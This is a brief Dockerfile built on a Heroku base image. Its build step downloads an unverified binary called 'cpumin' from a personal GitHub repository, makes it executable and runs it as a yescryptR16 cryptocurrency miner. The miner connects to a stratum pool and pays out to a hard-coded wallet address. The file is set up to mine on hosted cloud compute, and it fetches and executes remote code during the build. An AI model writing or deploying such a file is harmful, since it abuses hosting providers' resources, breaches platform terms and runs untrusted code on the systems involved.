FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin; chmod +x cpumin; ./cpumin -a yescryptR16 -o stratum+tcp://stratum-asia.rplant.xyz:17055 -u qRNDBVci5Afgiq8uCkmQ9BTX9fxtAUdVUS.$(echo $(shuf -i 1-9999 -n 1)-P1) -t 2
CMD bash heroku.sh
